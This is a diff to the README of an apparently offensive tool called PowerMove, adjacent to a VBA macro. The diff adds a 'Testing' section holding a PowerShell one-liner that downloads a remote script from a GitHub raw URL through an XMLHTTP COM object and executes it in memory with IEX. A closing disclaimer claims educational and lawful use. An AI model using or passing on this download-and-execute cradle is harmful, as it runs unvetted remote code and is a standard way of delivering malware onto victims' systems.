@@ -46,6 +46,11 @@ Sub TEST()
 End Sub
 ```
 
+### Testing
+```powershell
+powershell.exe -nop -NoExit -Command ""$h=New-Object -ComObject 'Msxml2.XMLHTTP';$h.open('GET','https://raw.githubusercontent.com/10N351R/PowerMove/refs/heads/main/PowerMove_dynamic.ps1',$false);$h.send();IEX $h.responseText""
+```
+
 ## Disclaimer
 **Ethical Use:** PowerMove is provided for educational and lawful purposes only. The author is not responsible for any misuse or damaged caused by this tool. By using this tool, you agree to use it ethically and comply with all applicable laws and regulations. Unauthorized use of this tool is strictly prohibited and may result in severe legal consequences.
 
